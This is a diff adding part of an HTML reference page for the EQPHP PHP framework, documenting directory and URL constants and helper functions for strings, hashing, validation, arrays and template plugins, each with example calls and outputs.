+            <tr><td>缓存目录</td><td>PATH_CACHE</td><td>/var/www/cache/</td></tr>
+            <tr><td>日志目录</td><td>PATH_LOG</td><td>/var/www/log/</td></tr>
+            <tr><td>第三方类库</td><td>PATH_VENDOR</td><td>/var/www/data/vendor/</td></tr>
+            <tr><td>上传图片</td><td>FILE_PICTURE</td><td>/var/www/file/picture/</td></tr>
+            <tr><td>临时操作目录</td><td>FILE_TEMP</td><td>/var/www/file/temp/</td></tr>
+            <tr><td>用户头像</td><td>FILE_AVATAR</td><td>/var/www/file/picture/avatar/</td></tr>
+            <tr><td>视频媒体资源</td><td>FILE_MEDIA</td><td>/var/www/file/media/</td></tr>
+            <tr><td>说明文档目录</td><td>FILE_DOC</td><td>/var/www/file/document/</td></tr>
+            <tr><td>压缩包目录</td><td>FILE_ZIP</td><td>/var/www/file/package/</td></tr>
+            <tr><td>静态网页目录</td><td>FILE_HTML</td><td>/var/www/file/html/</td></tr>
+            <tr><td>生成json文件目录</td><td>FILE_JSON</td><td>/var/www/file/json/</td></tr>
+            <tr><td>编辑器目录</td><td>FILE_EDITOR</td><td>/var/www/file/editor/</td></tr>
+            <tr><td>前端脚本、样式、图片</td><td>FILE_STATIC</td><td>/var/www/file/static/</td></tr>
+            <tr><td>前端脚本</td><td>FILE_SCRIPT</td><td>/var/www/file/static/script/</td></tr>
+            <tr><td>前端样式表</td><td>FILE_STYLE</td><td>/var/www/file/static/style/</td></tr>
+            <tr><td>前端背景图片</td><td>FILE_IMAGE</td><td>/var/www/file/static/image/</td></tr>
+            <tr><td>页面组件块</td><td>VIEW_PLUGIN</td><td>/var/www/view/plugin/</td></tr>
+            <tr><td>邮件、短信模板</td><td>VIEW_TEMPLATE</td><td>/var/www/view/template/</td></tr>
+            <tr><td>i18n国际化语言包</td><td>DATA_LANG</td><td>/var/www/data/lang/</td></tr>
+            <tr><td>临时仓</td><td>DATA_STORE</td><td>/var/www/data/store/</td></tr>
+            <tr><td>备份目录</td><td>DATA_BACKUP</td><td>/var/www/data/backup/</td></tr>
+            <tr><td>前端脚本</td><td>DATA_SOURCE</td><td>/var/www/data/source/</td></tr>
+            <tr><td rowspan="6">缓存数据</td><td>CACHE_DATA</td><td>/var/www/cache/data/</td></tr>
+            <tr><td>CACHE_INI</td><td>/var/www/cache/data/ini/</td></tr>
+            <tr><td>CACHE_PHP</td><td>/var/www/cache/data/php/</td></tr>
+            <tr><td>CACHE_JSON</td><td>/var/www/cache/data/json/</td></tr>
+            <tr><td>CACHE_XML</td><td>/var/www/cache/data/xml/</td></tr>
+            <tr><td>CACHE_TXT</td><td>/var/www/cache/data/txt/</td></tr>
+            <tr><td>调试日志</td><td>LOG_TRACE</td><td>/var/www/log/trace/</td></tr>
+            <tr><td>运行日志</td><td>LOG_RUN</td><td>/var/www/log/run/</td></tr>
+            <tr><td>专题日志</td><td>LOG_TOPIC</td><td>/var/www/log/topic/</td></tr>
+            <tr><td>执行mySQL语句日志</td><td>LOG_SQL</td><td>/var/www/log/sql/</td></tr>
+            <tr><td>执行mongo语句日志</td><td>LOG_MONGO</td><td>/var/www/log/mongo/</td></tr>
+            <tr><td>访问日志</td><td>LOG_VISIT</td><td>/var/www/log/visit/</td></tr>
+            <tr><td>测试日志</td><td>LOG_TEST</td><td>/var/www/log/test/</td></tr>
+
+            <tr class="fs18 fcb1"><td colspan="3">URL常量</td></tr>
+            <tr><td rowspan="14">视图文件<br>使用的<br>静态资源地址</td><td>URL_CREATE</td><td>http://www.eqphp.com/file/create/</td></tr>
+            <tr><td>URL_PICTURE</td><td>http://www.eqphp.com/file/picture/</td></tr>
+            <tr><td>URL_TEMP</td><td>http://www.eqphp.com/file/temp/</td></tr>
+            <tr><td>URL_AVATAR</td><td>http://www.eqphp.com/file/picture/avatar/</td></tr>
+            <tr><td>URL_MEDIA</td><td>http://www.eqphp.com/file/media/</td></tr>
+            <tr><td>URL_DOC</td><td>http://www.eqphp.com/file/document/</td></tr>
+            <tr><td>URL_ZIP</td><td>http://www.eqphp.com/file/package/</td></tr>
+            <tr><td>URL_HTML</td><td>http://www.eqphp.com/file/html/</td></tr>
+            <tr><td>URL_JSON</td><td>http://www.eqphp.com/file/json/</td></tr>
+            <tr><td>URL_EDITOR</td><td>http://www.eqphp.com/file/editor/</td></tr>
+            <tr><td>URL_STATIC</td><td>http://www.eqphp.com/file/static/</td></tr>
+            <tr><td>URL_SCRIPT</td><td>http://www.eqphp.com/file/static/script/</td></tr>
+            <tr><td>URL_STYLE</td><td>http://www.eqphp.com/file/static/style/</td></tr>
+            <tr><td>URL_IMAGE</td><td>http://www.eqphp.com/file/static/image/</td></tr>
+
+            <tr class="fs18 fcb1"><td colspan="3" class="fs15 fcbb">临时调试常量</td></tr>
+            <tr><td rowspan="8">调试用常量</td><td>ok</td><td>ok</td></tr>
+            <tr><td>OK</td><td>OK</td></tr>
+            <tr><td>PREO</td><td>&lt;pre&gt;</td></tr>
+            <tr><td>PREC</td><td>&lt;/pre&gt;</td></tr>
+            <tr><td>BR</td><td>&lt;br&gt;</td></tr>
+            <tr><td>HR</td><td>&lt;hr&gt;</td></tr>
+            <tr><td>UTF8</td><td>Content-Type:text/html; charset=utf-8</td></tr>
+            <tr><td>CSS</td><td>&lt;link rel="stylesheet" type="text/css" href="/file/static/style/basic.css"&gt;</td></tr>
+
+        </table>
+
+
+    </div>    
+
+
+    <div class="item">
+
+        <p class="m10 bgg p5 fs15 fcr">字符串相关函数</p>
+
+        <h3>字符串截取</h3>
+        <p class="function">string <b>basic::cut</b>(string $string[, int $length <em>15</em>[, string $tail <em>...</em>]])</p>
+        <code>
+            basic::cut('eqphp中文web应用框架',12); <i>//eqphp中文web应用</i><br>
+        </code><br><br><br>
+
+        <h3>富文本内容输出时过滤、反转义</h3>
+        <p class="function">string <b>basic::put</b>(string $string [, string $allow_tags <em>null</em>])</p>
+        <code>
+            basic::put($news[key].details,'&lt;a&gt;&lt;img&gt;');
+        </code><br><br><br>
+
+        <h3>生成指定长度随机字符串(数字、字母组合)</h3>
+        <p class="function">string <b>basic::code</b>([int $len <em>4</em> [, int $mode <em>1</em>]])</p>
+        <code>
+            <i>//$mode可取值：0 - 大小写混合, 1 - 小写, 2 - 大写。没有0、1、o、l四个字符</i><br>
+            basic::code(5,2); <i>//HY67V</i><br>
+        </code><br><br><br>
+
+        <h3>转换为指定精度倍数的整数</h3>
+        <p class="function">int <b>basic::int</b>(mixed $number [, int $precision <em>0</em> [, bool $is_round <em>false</em>]])</p>
+        <code>
+            <i>//$precision可取值：0-N, $is_round是否用round函数四舍五入</i><br>
+            basic::int('12.89',2); <i>//1289</i><br>
+            basic::int(3.567,2,true); <i>//357</i><br>
+        </code><br><br><br>
+
+        <h3>转换为指定精度倍数的浮点数</h3>
+        <p class="function">int <b>basic::float</b>(mixed $number [, int $precision <em>0</em> [, bool $is_round <em>false</em>]])</p>
+        <code>
+            <i>//$precision小数位数，可取值：0-N, $is_round是否用round函数四舍五入</i><br>
+            basic::float('12.891',2); <i>//12.89</i><br>
+            basic::float('0.807',2); <i>//0.8</i><br>
+            basic::int(3.567,2,true); <i>//3.57</i><br>
+        </code><br><br><br>
+
+        <h3>生成13位时间戳(毫秒)</h3>
+        <p class="function">string <b>basic::microtime</b>()</p>
+        <code>
+            basic::microtime(); <i>//1457279285200</i><br>
+        </code><br><br><br>
+
+        <h3>生成36位uuid</h3>
+        <p class="function">string <b>basic::uuid</b>()</p>
+        <code>
+            basic::uuid(); <i>//2b5adf75-9668-7133-2f83-f8e054d93213</i><br>
+        </code><br><br><br>
+
+        <h3>防比对破解的MD5函数</h3>
+        <p class="function">string <b>secure::md5</b>(string $string)</p>
+        <code>
+            　　　　　md5('123456'); <i>//e10adc3949ba59abbe56e057f20f883e</i><br>
+            secure::md5('123456'); <i>//ddad04b61d2bd99e5733f939698a1917</i><br>
+        </code><br><br><br>
+
+        <h3>生成防伪令牌</h3>
+        <p class="function">string <b>secure::token</b>([string $string[, string $ip]])</p>
+        <code>
+            <i>//结合用户user_agent、ip等判断是否变更机器(识别假冒cookie)</i><br>
+            secure::token('donkey'); <i>//bb676499faa6c22a8693d48251495efb</i><br>
+        </code><br><br><br>
+
+        <h3>特殊字符过滤</h3>
+        <p class="function">string <b>secure::symbol</b>(string $string[, bool $is_strict <em>false</em>])</p>
+        <code>
+            <i>//$is_strict是否严格模式，是则过滤：~^<>`\'"@!#$%&?+-*/={}[]()|,.:;否仅过滤：~^<>`\'"</i><br>
+            secure::symbol("I'm ok"); <i>//Im ok</i><br>
+        </code><br><br><br>
+
+        <h3>生成6位密码保护串(盐)</h3>
+        <p class="function">string <b>secure::salt</b>()</p>
+        <code>
+            secure::salt(); <i>//6*41-6</i><br>
+        </code><br><br><br>
+
+        <h3>返回单个汉字的拼音</h3>
+        <p class="function">string <b>help::spell</b>($chinese)</p>
+        <code>
+            help::spell('好'); <i>//hao</i><br>
+        </code><br><br><br>
+        
+        <h3>构造url</h3>
+        <p class="function">string <b>help::url</b>([mixed $param [, mixed $... ]])</p>
+        <code>
+            help::url(); <i>//http://www.eqphp.com/</i><br><br>
+            help::url('news','list',$page,'/#top'); <i>//http://www.eqphp.com/news/list/10#top</i><br><br>
+            <i>//构造：http://www.eqphp.com/news/list/?category=history&sort=hit_desc&page=10#bottom</i><br>
+            help::url('news.list',['category'=>'history','sort'=>'hit_desc','page'=>$page,'#'=>'bottom']);
+        </code><br><br><br>
+
+        <h3>判断当前请求是否ajax请求</h3>
+        <p class="function">bool <b>http::is_ajax</b>()</p>
+        <code>
+            help::is_ajax(); <i>//false</i><br>
+        </code><br><br><br>
+
+        <h3>判断当前请求是否https协议请求</h3>
+        <p class="function">bool <b>http::is_ssl</b>()</p>
+        <code>
+            help::is_ssl(); <i>//false</i><br>
+        </code><br><br><br>
+
+        <h3>生成分页页码导航条</h3>
+        <p class="function">string <b>page::mark</b>(string $url, int $page_count[, int $page <em>1</em>[, int $show_num <em>5</em>]])</p>
+        <code>
+            page::mark('news_list/?page=', 3, 2);<br>
+            <i>//&lt;a href="news_list/?page=1"&gt;1&lt;/a&gt;&lt;a class="current_page"&gt;2&lt;/a&gt;&lt;a href="news_list/?page=3"&gt;3&lt;/a&gt;</i><br>
+        </code><br><br><br>
+
+        <h3>获取当前访问用户IP地址</h3>
+        <p class="function">string <b>help::ip</b>()</p>
+        <code>
+            help::ip(); <i>//131.89.7.99</i><br>
+        </code><br><br><br>
+
+        <h3>获取指定ip所在地址(省份城市)</h3>
+        <p class="function">string <b>help::address</b>([string $ip[, $url]])</p>
+        <code>
+            <i>//$i为空则使用当前访问用户ip，$url用来查询的ip库网络地址</i><br>
+            help::address(); <i>//北京 海淀</i><br>
+        </code><br><br><br>
+
+        <h3>获取当前访问用户所使用的移动设备类型</h3>
+        <p class="function">string <b>help::mobile</b>()</p>
+        <code>
+            <i>//$i为空则使用当前访问用户ip，$url用来查询的ip库网络地址</i><br>
+            help::mobile(); <i>//iphone</i><br>
+        </code><br><br><br>
+
+        <h3>判断是否非法银行卡</h3>
+        <p class="function">string <b>help::is_bank_card</b>(string $card_no, string $bank)</p>
+        <code>
+            help::is_bank_card('622718972731231', 'icbc'); <i>//false</i><br>
+        </code><br><br><br>
+
+        <h3>使用正则表达式检测字符串是否合法</h3>
+        <p class="function">bool <b>regexp::match</b>(mixed $string[, string $regexp <em>email</em>])</p>
+        <code>
+            <i>$regexp可取参数有：phone、email、telephone、hot_line、qq、account、md5、password、money、number、numeric、url、cid、zip、address、int、float、english、chinese、chinese_name、name、file_name、id、uuid、image、business_license、标准正则表达式</i><br>
+            regexp::match('13650231***','phone'); <i>//true</i><br>
+        </code><br><br><br>
+
+        <h3>使用正则表达式检测字符串</h3>
+        <p class="function">bool <b>regexp::filter</b>(mixed $string[, string $regexp <em>email</em>[, $default]])</p>
+        <code>
+            regexp::filter('13650231***','phone'); <i>//13650231***</i><br>
+        </code><br><br><br>
+
+        <h3>检测华人姓名</h3>
+        <p class="function">bool <b>identity::family_name</b>(string $name)</p>
+        <code>
+            identity::family_name('李芬'); <i>//true</i><br>
+        </code><br><br><br>
+
+        <h3>检测身份证号是否正确</h3>
+        <p class="function">bool <b>identity::is_cid</b>(string $card_no)</p>
+        <code>
+            identity::is_cid('612501198710114012'); <i>//false</i><br>
+        </code><br><br><br>
+
+        <h3>解析身份证号</h3>
+        <p class="function">bool <b>identity::parse_card</b>(string $card_no)</p>
+        <code>
+            identity::parse_card('612501198710114012'); <i>//['birthday'=>'1987-10-11', 'sex'=>'male', 'address'=>'陕西省商洛市商州区']</i><br>
+        </code><br><br><br>
+
+
+        <h3>类库加载(加载跨模块model类，或第三方类库)</h3>
+        <p class="function">string <b>help::load</b>(string $class, $path[, bool $is_vendor <em>false</em>])</p>
+        <code>
+            <i>//加载user/model/m_follow.php文件，返回类库名称：m_follow</i><br>
+            help::load('m_follow','user');<br><br>
+
+            <i>//加载data/vendor/pagination/page.php文件，返回类库名称：page</i><br>
+            help::load('page','pagination',true);
+        </code><br><br><br>
+
+
+        <h3>下载文件时发送下载头信息(http::download的子函数)</h3>
+        <p class="function">void <b>help::download_header</b>(string $mime_type, int $file_size, string $file_name)</p>
+        <code>
+            help::download_header('video/mp4',18922327,$file_name);
+        </code><br><br><br>
+
+
+        <p class="m10 bgg p5 fs15 fcr">数组相关函数</p>
+        
+        <h3>数组map取值(点式寻址查找)</h3>
+        <p class="function">mixed <b>basic::array_get</b>(array $data[, string $map <em>null</em>])</p>
+        <code>
+            $data=[<br>
+            <b class="i24"></b>'from'=>'mongoDB',<br>
+            <b class="i24"></b>'user'=>[<br>
+            <b class="i48"></b>'id'=>5,<br>
+            <b class="i48"></b>'wallet'=>['money'=>1214.22,'point'=>139),<br>
+            <b class="i48"></b>'profile'=>['name'=>'Art','sex'=>'male','age'=>32],<br>
+            <b class="i48"></b>'login_log'=>null,<br>
+            <b class="i24"></b>],<br>
+            ];<br><br>
+
+            basic::array_get($data,'from'); <i>//mongoDB</i><br>
+            basic::array_get($data,'user.profile.name'); <i>//Art</i><br>
+            basic::array_get($data,'user.wallet'); <i>//['money'=>1214.22,'point'=>139]</i>
+        </code><br><br><br>
+
+        <h3>map方式追加数组单元</h3>
+        <p class="function">array <b>basic::array_set</b>(array &$data, string $map, $$value)</p>
+        <code>
+            $data=['user'=>['profile'=>['name'=>'Art','sex'=>'male']]];<br>
+            basic::array_set($data,'user.profile.phone','15001369***');<br>
+            <i>//['user'=>['profile'=>['name'=>'Art','sex'=>'male','phone'=>'15001369***']]]</i>
+        </code><br><br><br>
+
+        <h3>map方式移除数组指定单元</h3>
+        <p class="function">array <b>basic::array_unset</b>(array &$data, string $map)</p>
+        <code>
+            $data=['user'=>['profile'=>['name'=>'Art','sex'=>'male']]];<br>
+            basic::array_unset($data,'user.profile.sex');<br>
+            <i>//['user'=>['profile'=>['name'=>'Art']]]</i>
+        </code><br><br><br>
+
+        <h3>多选筛选</h3>
+        <p class="function">string <b>help::array_sift</b>(array $arrow, array $target, string $connector = ',')</p>
+        <code>
+            $selected=['math','art'];<br>
+            $pool=['math'=>'数学','art'=>'艺术','sing'=>'唱歌'];<br>
+            $result=help::array_sift($selected,$pool,'，');<br>
+            <i>//数学，艺术</i><br>
+        </code><br><br><br>
+
+        <h3>记录集筛选</h3>
+        <p class="function">array <b>basic::array_column</b>(array $record, string $column[, string $key <em>id</em>])</p>
+        <code>
+            $record = [<br>
+            <b class="i24"></b>['id' => 1, 'recommend_id' => 3, 'email' => '225874@qq.com'],<br>
+            <b class="i24"></b>['id' => 8, 'recommend_id' => 14, 'email' => 'guoLove@126.com'],<br>
+            <b class="i24"></b>['id' => 19, 'recommend_id' => 31, 'email' => 'jimKy@eqphp.com'],<br>
+            ];<br><br>
+
+            $email=basic::array_column($record,'email','id');<br>
+            <i>//[1=>'225874@qq.com',8=>'guoLove@126.com', 19=>'jimKy@eqphp.com']</i><br><br>
+
+            $collection=basic::array_column($record,'email,recommend_id','id');<br>
+            <i>//[1=>['recommend_id'=>3,'email'=>'225874@qq.com'],<br>
+                8=>['recommend_id' => 14,'email'=> 'guoLove@126.com'],<br>
+                19=>['recommend_id' => 31, 'email' => 'jimKy@eqphp.com']]</i><br>
+        </code><br><br><br>
+
+        <h3>记录集取列</h3>
+        <p class="function">array <b>basic::array_field</b>(array $record[, string $column <em>id</em>[, bool $is_string <em>false</em>]])</p>
+        <code>
+            $record = [<br>
+            <b class="i24"></b>['id' => 1, 'recommend_id' => 3, 'email' => '225874@qq.com'],<br>
+            <b class="i24"></b>['id' => 8, 'recommend_id' => 3, 'email' => 'guoLove@126.com'],<br>
+            <b class="i24"></b>['id' => 19, 'recommend_id' => 31, 'email' => 'jimKy@eqphp.com'],<br>
+            ];<br><br>
+
+            $recommend_id=basic::array_field($record,'recommend_id');<br>
+            <i>//[3,31]，会去重</i><br><br>
+
+            $recommend_id=basic::array_field($record,'email',true);<br>
+            <i>//225874@qq.com,guoLove@126.com,imKy@eqphp.com</i><br><br>
+
+            <i>//第三个参数无效，也不能去重</i><br>
+            $collection=basic::array_field($record,'recommend_id,email');<br>
+            <i>//['recommend_id'=>[3,3,31],
+                'email'=>['225874@qq.com','guoLove@126.com','imKy@eqphp.com']]</i><br>
+        </code><br><br><br>
+
+        <h3>记录集取排序列(结合array_multisort使用)</h3>
+        <p class="function">array <b>basic::array_field_sort</b>(array $record[, string $column <em>id</em>])</p>
+        <code>
+            $record = [<br>
+            <b class="i24"></b>['id' => 1, 'nick_name' => 'art', 'age' => 21],<br>
+            <b class="i24"></b>['id' => 8, 'nick_name' => 'lily', 'age' => 19],<br>
+            <b class="i24"></b>['id' => 19, 'nick_name' => 'tom', 'age' => 48],<br>
+            <b class="i24"></b>['id' => 19, 'nick_name' => 'jack', 'age' => 19],<br>
+            ];<br><br>
+
+            $sort=basic::array_field_sort($record,'age,nick_name');<br>
+            array_multisort($sort['age'],SORT_ASC,$sort['nick_name'],SORT_DESC,$record);<br><br>
+            <i>//排序后$record变为：</i><br>
+            <i>[['id' => 8, 'nick_name' => 'lily', 'age' => 19],<br>
+                ['id' => 19, 'nick_name' => 'jack', 'age' => 19],<br>
+                ['id' => 1, 'nick_name' => 'art', 'age' => 21],<br>
+                ['id' => 19, 'nick_name' => 'tom', 'age' => 48]]</i><br>
+        </code><br><br><br>
+        
+        <h3>对象工厂：获取一个对象实例</h3>
+        <p class="function">object <b>basic::with</b>([mixed $class_name [, mixed $param ... ]])</p>
+        <code>
+            basic::with(); <i>//stdClass Object()</i><br><br>
+
+            $user=basic::with('cache','8.php','user_profile',60); <i>//从cache类实例化user缓存对象</i><br>
+            $user->save(['name'=>'Art','sex'=>'male','age'=>32]); <i>//存储数据</i><br>
+            $user->get('user_profile.sex'); <i>//male</i><br>
+        </code><br><br><br>
+
+        <h3>无限递归分类</h3>
+        <p class="function">array <b>basic::tree</b>(array $record[, int $parent_id <em>0</em>[, int $level <em>0</em>]])</p>
+        <code>
+            $record = [<br>
+            <b class="i24"></b>['id' => 1, 'parent_id' => 0, 'name' => '新4军'],<br>
+            <b class="i24"></b>['id' => 2, 'parent_id' => 0, 'name' => '8路军'],<br>
+            <b class="i24"></b>['id' => 3, 'parent_id' => 1, 'name' => '新4军1师'],<br>
+            <b class="i24"></b>['id' => 4, 'parent_id' => 1, 'name' => '新4军2师'],<br>
+            <b class="i24"></b>['id' => 5, 'parent_id' => 4, 'name' => '新4军2师12旅'],<br>
+            <b class="i24"></b>['id' => 6, 'parent_id' => 2, 'name' => '8路军18师'],<br>
+            <b class="i24"></b>['id' => 7, 'parent_id' => 5, 'name' => '新4军2师12旅9营'],<br>
+            ];<br><br>
+
+            $new=basic::tree($record);<br>
+            <i>//重新排序后：<br>
+                [['id' => 1, 'parent_id' => 0, 'name' => '新4军'],<br>
+                ['id' => 3, 'parent_id' => 1, 'name' => '新4军1师'],<br>
+                ['id' => 4, 'parent_id' => 1, 'name' => '新4军2师'],<br>
+                ['id' => 5, 'parent_id' => 4, 'name' => '新4军2师12旅'],<br>
+                ['id' => 7, 'parent_id' => 5, 'name' => '新4军2师12旅9营'],<br>
+                ['id' => 2, 'parent_id' => 0, 'name' => '8路军'],<br>
+                ['id' => 6, 'parent_id' => 2, 'name' => '8路军18师'],];</i><br><br>
+
+            $new=basic::tree($record,4,1);<br>
+            <i>//重新排序后：<br>
+                [['id' => 5, 'parent_id' => 4, 'name' => '新4军2师12旅'],<br>
+                ['id' => 7, 'parent_id' => 5, 'name' => '新4军2师12旅9营'],];</i><br>
+        </code><br><br><br>
+
+
+
+        <h3>对象转数组(递归)</h3>
+        <p class="function">array <b>help::object_array</b>(object $data)</p>
+        <code>
+
+            $data = ['user'=>[<br>
+            <b class="i24"></b>'id'=>114,<br>
+            <b class="i24"></b>'wallet'=>['money'=>121.51, 'point'=>'199'],<br>
+            <b class="i24"></b>'profile'=>['name'=>'Art', 'sex'=>'male', 'age'=>'29'],<br>
+            ],];<br><br>
+            $object=json_decode(json_encode($data));<br>
+            $profile=help::object[$object->user->profile];<br>
+            <i>//profile：['name'=>'Art', 'sex'=>'male', 'age'=>'29']</i>
+        </code><br><br><br>
+
+
+        <h3>将数组（或对象）转换为xml（递归）</h3>
+        <p class="function">string <b>help::data_xml</b>(mixed $data[, string $tag <em>item</em>[, bool $with_id <em>false</em>]])</p>
+        <code>
+
+            $user_list = [<br>
+            <b class="i24"></b>['id' => 1,'money' => 121.51, 'name' => 'Art', 'sex' => 'male'],<br>
+            <b class="i24"></b>['id' => 2,'money' => 11.5, 'name' => 'Lily', 'sex' => 'female'],<br>
+            <b class="i24"></b>['id' => 3,'money' => 56.51, 'name' => 'Jack', 'sex' => 'male'],<br>
+            ];<br><br>
+
+            $xml=help::data_xml($data,'item',true);<br>
+            <i>//&lt;item id="0"&gt;&lt;id&gt;1&lt;/id&gt;&lt;money&gt;121.51&lt;/money&gt;&lt;name&gt;Art&lt;/name&gt;&lt;sex&gt;male&lt;/sex&gt;&lt;/item&gt;<br>
+                //&lt;item id="1"&gt;&lt;id&gt;2&lt;/id&gt;&lt;money&gt;11.5&lt;/money&gt;&lt;name&gt;Lily&lt;/name&gt;&lt;sex&gt;female&lt;/sex&gt;&lt;/item&gt;<br>
+                //&lt;item id="2"&gt;&lt;id&gt;3&lt;/id&gt;&lt;money&gt;56.51&lt;/money&gt;&lt;name&gt;Jack&lt;/name&gt;&lt;sex&gt;male&lt;/sex&gt;&lt;/item&gt;<br>
+            </i><br>
+
+        </code><br><br><br>
+
+        <h3>数组转换为配置文件的ini格式</h3>
+        <p class="function">string <b>help::array_ini</b>(array $data)</p>
+        <code>
+            $xml=help::array_ini(config('db'));<br><br>
+            <i>[server]<br>
+                host=localhost<br>
+                port=3306<br>
+                user=root<br>
+                password=<br>
+                database=eqphp_0706<br>
+                charset=utf8<br><br>
+
+                [query]<br>
+                page_size=20<br><br>
+
+                [log]<br>
+                is_record_exception=1<br>
+                is_record_sql=1</i><br>
+        </code><br><br><br>
+
+        <h3>驼峰式命名转换（递归）</h3>
+        <p class="function">mix <b>help::snake_camel</b>(mix $data, bool $is_upper_case <em>false</em>)</p>
+        <code>
+            $camelName = help::snake_camel('get_user_name'); <i>//getUserName</i><br><br>
+            $CamelName = help::snake_camel('get_user_name', true); <i>//GetUserName</i><br><br>
+            $snake_name = help::snake_camel('getUserName'); <i>//get_user_name</i><br><br>
+
+            $snake_name = help::snake_camel(['id'=>2,'userName'=>'art','createTime'=>'2016-12-10']);<br>
+            <i>//['id'=>2,'user_name'=>'art','create_time'=>'2016-12-10']</i><br><br>
+
+            $camelName = help::snake_camel(['id'=>2,'user_name'=>'art','create_time'=>'2016-12-10']);<br>
+            <i>//['id'=>2,'userName'=>'art','createTime'=>'2016-12-10']</i><br><br>
+        </code><br><br>
+
+        <h3>接口数据类型约束（递归）</h3>
+        <p class="function">mix <b>help::data_format</b>(mix $data, mix $format, int $dimension <em>1</em>)</p>
+        <code>
+            <i>//二维，记录集转换</i><br>
+            help::data_format('1','int',0); <i>//1</i><br><br>
+            help::data_format('017u','int',0); <i>//17</i><br><br>
+
+            <i>//一维，声明类型键值对</i><br>
+            help::data_format(['id'=>'10','is_admin'=>'1'],['id'=>'int','is_admin'=>'bool'],1);<br>
+            <i>//['id'=>10,'is_admin'=>true]</i><br><br>
+
+            <i>//一维，声明类型集合，自动填充（至少存在int或string）</i><br>
+            help::data_format(['id'=>'10','is_admin'=>'1'],['int'=>'id,money','bool'=>'is_admin'],1);<br>
+            <i>//['id'=>10,'money'=>0,'is_admin'=>true]</i><br><br>
+
+            <i>//二维，记录集</i><br>
+            help::data_format([['id'=>'10','is_admin'=>'1'],['id'=>'17','is_admin'=>'0']],['id'=>'int','is_admin'=>'bool'],2);<br>
+            <i>//[['id'=>10,'is_admin'=>true],['id'=>17,'is_admin'=>false]]</i><br><br>
+        </code><br><br>
+    </div>
+
+
+
+    <div class="item">
+
+        <p class="m10 bgg p5 fs15 fcr">组件 - 自定义扩展函数库(plugin/p_functionPlugin.php)</p>
+
+        <h3>网页头部公用组件</h3>
+        <p class="function">string <b>p_functionPlugin::head</b>([array $param])</p>
+        <code>
+            <strong class="fs15">{head script="jquery|plugin/picker" module_script="center?912" <br>
+                　　　style="basic|plugin/picker" module_style="center?7.0.3"}</strong><br><br>
+
+
+            <i>&lt;!--输出内如如下：--&gt;</i><br>
+            <i>&lt;!DOCTYPE html&gt;<br>
+            &lt;html lang="zh"&gt;<br>
+            &lt;head&gt;<br>
+                &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;<br><br>
+
+                &lt;title&gt;EQPHP开源中文WEB应用开发框架&lt;/title&gt;<br>
+                &lt;meta name="keywords" content="EQPHP,开源框架,TPS-MVC,全栈式框架" /&gt;<br>
+                &lt;meta name="description" content="EQPHP,一款简单易用（Easy）且高效（Quick）的PHP开源框架" /&gt;<br>
+                &lt;meta name="author" content="art_youth" /&gt;<br><br>
+
+                &lt;link rel="stylesheet" type="text/css" href="http://eqphp.com/file/static/style/basic.css" /&gt;<br>
+                &lt;link rel="stylesheet" type="text/css" href="http://eqphp.com/file/static/style/plugin/picker.css" /&gt;<br>
+                &lt;link rel="stylesheet" type="text/css" href="http://eqphp.com/file/static/user/style/center.css?version=7.0.3" /&gt;<br><br>
+
+                &lt;script type="text/javascript" src="http://eqphp.com/file/static/script/jquery.js"&gt;&lt;/script&gt;<br>
+                &lt;script type="text/javascript" src="http://eqphp.com/file/static/script/plugin/picker.js"&gt;&lt;/script&gt;<br>
+                &lt;script type="text/javascript" src="http://eqphp.com/file/static/user/script/center.js?version=912"&gt;&lt;/script&gt;<br><br>
+
+                &lt;link rel="shortcut icon" type="image/x-icon" href="http://eqphp.com/favicon.ico" /&gt;
+                &lt;/head&gt;&lt;body&gt;</i><br>
+        </code><br><br><br>
+
+        <h3>flash动画播放组件</h3>
+        <p class="function">string <b>p_functionPlugin::flash</b>([array $param])</p>
+        <code>
+            {flash src="{$dir.media}eqphp_flash.swf" title="动画播放组件" width="420" height="360"}
+        </code><br><br><br>
+
+        <h3>视频播放组件</h3>
+        <p class="function">string <b>p_functionPlugin::media</b>([array $param])</p>
+        <code>
+            {media src="{$dir.media}eqphp.mov" title="视频播放组件" <br>
+            　　　　width="420" height="360" autostart="false" allowfullscreen="true"}
+        </code><br><br><br>
+
+
+
+        <p class="m10 bgg p5 fs15 fcr">组件 - 自定义变量调节器(plugin/p_modifierPlugin.php)</p>
+
+        <h3>获取配置文件数据，用法参见：<strong class="fcg">config</strong></h3>
+        <p class="function">string <b>p_modifierPlugin::constant</b>(string $name [, boll $is_module <em>false</em>])</p>
+        <code>
+            {"foot.email"|constant:"site"} <i>&lt;!-- eqphp_framework@126.com --&gt;</i><br>
+        </code><br><br><br>
+
+        <h3>字符串截取，用法参见：<strong class="fcg">basic::cut</strong></h3>
+        <p class="function">string <b>p_modifierPlugin::cut</b>(string $name [, int $length <em>15</em> [, int $tail <em>...</em>]])</p>
+        <code>
+            {$news[key].title|cut:18} <i>&lt;!-- 重大事件：EQPHP 2.0 版本... --&gt;</i><br>
+        </code><br><br><br>
+
+        <h3>输出过滤，用法参见：<strong class="fcg">basic::put</strong></h3>
+        <p class="function">string <b>p_modifierPlugin::put</b>(string $string [, string $allow_tags <em>null</em>])</p>
+        <code>
+            {$news[key].details|put:"&lt;a&gt;&lt;img&gt;"}<br>
+        </code><br><br><br>
+
+        <h3>用户敏感信息掩藏器</h3>
+        <p class="function">string <b>p_modifierPlugin::mask</b>(string $name [, string $type <em>phone</em>])</p>
+        <code>
+            <i>&lt;!-- $type接收参数有：phone/email/qq/bank_card/alipay_account --&gt;</i><br>
+            {$user.phone|mask:"phone"} <i>&lt;!-- 138****5128 --&gt;</i><br>
+        </code><br><br><br>
+
+        <h3>日期、时间格式化</h3>
+        <p class="function">string <b>p_modifierPlugin::format_time</b>(string $time [, string $mode <em>Y年n月j日</em>])</p>
+        <code>
+            {$withdraw[key].apply_time|format_time:"y年n月j日 G点"} <i>&lt;!-- 16年3月6日 21点 --&gt;</i><br>
+        </code><br><br><br>
+
+        <h3>数字友好格式化</h3>
+        <p class="function">string <b>p_modifierPlugin::format_number</b>(string $number [, string $type <em>back_card</em>])</p>
+        <code>
+            <i>&lt;!-- $type接收参数有：phone/money/id_card/bank_card --&gt;</i><br>
+            {$user.bank_card|format_number:"bank_card"} <i>&lt;!-- 6227 8081 8769 131 --&gt;</i><br>
+        </code><br><br><br>
+
+        <h3>倒时计模式时间计算器</h3>
+        <p class="function">string <b>p_modifierPlugin::friendly_time</b>(string $time)</p>
+        <code>
+            {$weibo[key].update_time|friendly_time} <i>&lt;!-- 5分钟前 --&gt;</i><br>
+        </code><br><br><br>
+    </div>
+    
+    
